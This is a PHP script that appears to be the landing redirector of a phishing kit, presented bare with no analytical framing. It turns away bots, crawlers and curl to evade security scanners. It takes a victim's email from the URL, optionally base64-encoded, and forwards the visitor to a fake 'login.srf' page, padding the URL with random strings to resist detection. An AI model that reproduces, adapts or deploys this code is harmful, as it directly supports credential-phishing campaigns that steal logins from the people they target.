<?php
error_reporting(0);

function RndString($length = 50) {
	return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, $length);
}

$rand1 = RndString(50);
$rand2 = RndString(50).''.RndString(50);
$rand3 = RndString(50).''.RndString(50).''.RndString(50);

// Block BOT by User Agent
$agent = $_SERVER['HTTP_USER_AGENT'];

// Block BOT by User Agent
$block_uagents = array('67.0.3396.99','bot','spider','crawler','curl');
foreach($block_uagents as $block_uagent){
    if(stristr($agent, $block_uagent) !== false) {
        exit(header("Location: https://www.google.com/"));
    }
}

if (isset($_GET['sub'])) {
	$data = $_GET['sub']; 
} elseif (preg_match("/[^\/]+$/", $_SERVER[ "REQUEST_URI" ])){
	preg_match("/[^\/]+$/", $_SERVER[ "REQUEST_URI" ], $matches); 
	$data = $matches[0];
} else {
	die(header("Location: https://en.wikipedia.org/wiki/HTTP_404"));
}

if ( base64_encode(base64_decode($data)) === $data){
    $email = base64_decode($data);
	$email = filter_var($email, FILTER_SANITIZE_EMAIL);
	if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
		die(header("Location: https://en.wikipedia.org/wiki/HTTP_404"));
	}  
} else {
    $email = $data;
	$email = filter_var($email, FILTER_SANITIZE_EMAIL);
	if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
		die(header("Location: ".$FailRedirect));
	}      
}

if(isset($base64encodeData) && ($base64encodeData===false || $base64encodeData==="false" || $base64encodeData==="FALSE" || $base64encodeData==="False")){
	$data = $email;
} else {
	$data = base64_encode($email);
}

header("Location: safety/?login.srf&$rand3.$rand2=$rand1.$rand2&kamu=$data&$rand2=$rand1");

?>